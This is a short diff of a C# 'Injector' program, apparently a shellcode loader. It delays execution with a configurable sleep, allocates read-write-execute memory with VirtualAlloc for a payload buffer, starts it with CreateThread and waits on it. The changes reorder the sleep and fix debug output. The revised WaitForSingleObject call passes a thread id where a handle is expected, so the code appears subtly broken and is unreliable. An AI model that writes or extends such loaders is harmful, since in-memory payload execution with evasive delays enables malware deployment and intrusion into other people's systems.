@@ -9,10 +9,10 @@ using System.Security;
 namespace Injector {
     public class Program {
         public static void Main(string[] args) {
-            Thread.Sleep(Global.sleep_time * 1000);
             #if _DEBUG_
-                Console.WriteLine("sleeping for {0} seconds!\n", Global.sleep_time);
+                Console.WriteLine("sleeping for {0} seconds!", Global.sleep_time);
             #endif
+            Thread.Sleep(Global.sleep_time * 1000);
             #if PINVOKE
                 IntPtr baseAddr = VirtualAlloc(0, (UInt32)Global.my_buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             #else
@@ -109,9 +109,9 @@ namespace Injector {
                 IntPtr pinfo = IntPtr.Zero;
                 Natives.CreateThread(0, 0, baseAddr, pinfo, 0, ref threadId);
                 #if _DEBUG_
-                    Console.WriteLine("Created thread 0x{0:x}...", hThread);
+                    Console.WriteLine("Created thread 0x{0:x}...", threadId);
                 #endif
-                Natives.WaitForSingleObject(hThread, 0xFFFFFFFF);
+                Natives.WaitForSingleObject(threadId, 0xFFFFFFFF);
             #endif
         }
 
